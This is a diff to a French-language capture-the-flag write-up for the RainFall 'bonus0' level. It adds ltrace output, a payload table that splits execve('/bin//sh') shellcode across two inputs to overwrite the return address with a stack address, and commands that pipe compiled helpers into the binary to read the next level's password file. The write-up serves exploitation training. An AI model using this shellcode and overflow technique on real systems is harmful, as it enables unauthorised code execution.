@@ -28,6 +28,32 @@ gdb-peda$ pattern offset AAnA
 <strong>AAnA found at offset: 13</strong>
 </pre>
 
+<pre>
+bonus0@RainFall:~$ (echo BBBBBBBBBBBBBBBBBBB; sleep 1; echo AAAAAAAAAAAAAAAAAAAAA; cat) | ltrace ./bonus0 
+\__libc_start_main(0x80485a4, 1, 0xbffff704, 0x80485d0, 0x8048640 <unfinished ...>
+puts(" - ")                                                                                = 4
+read(0, "BBBBBBBBBBBBBBBBBBB\n", 4096)                                                     = 20
+strchr("BBBBBBBBBBBBBBBBBBB\n", '\n')                                                      = "\n"
+strncpy(0xbffff5e8, "BBBBBBBBBBBBBBBBBBB", 20)                                             = 0xbffff5e8
+puts(" - ")                                                                                = 4
+read(0, "AAAAAAAAAAAAAAAAAAAAA\n", 4096)                                                   = 22
+strchr("AAAAAAAAAAAAAAAAAAAAA\n", '\n')                                                    = "\n"
+strncpy(0xbffff5fc, "AAAAAAAAAAAAAAAAAAAA", 20)                                            = 0xbffff5fc
+strcpy(<strong>0xbffff636</strong>, "BBBBBBBBBBBBBBBBBBB")                                                  = 0xbffff636
+strcat("BBBBBBBBBBBBBBBBBBB ", "AAAAAAAAAAAAAAAAAAAA\364\017\375\267")                     = "BBBBBBBBBBBBBBBBBBB AAAAAAAAAAAA"...
+puts("BBBBBBBBBBBBBBBBBBB AAAAAAAAAAAA"...)                                                = 45
++++ exited (status 0) +++
+</pre>
+- On a l'addresse de notre stack (*0xbffff636*)
+- Notre shellcode fait 21 carrecter donc on le decoupe en deux 20 dans le premier argument et 1 dans le deuxieme
+| Arg 1 | Arg 2 |
+|-------|-------|
+| `\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\n` | `\80` + `B` \* 8 + `0xbffff636` + `B` \* 20 + `\n`|
+- Donc en gros on overide la return address pour qu'elle renvoie sur notre shellcode
+- On utilise un code en C car il y a des problemes avec python
 ```
-(python -c "print('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd')" && ./a.out && cat)
+gcc /tmp/pattern.c -o /tmp/pat
+gcc /tmp/shellcode.c -o /tmp/shell
+(/tmp/shell; sleep 1; /tmp/pat; cat) | ./bonus0
+cat /home/user/bonus0/.pass
 ```
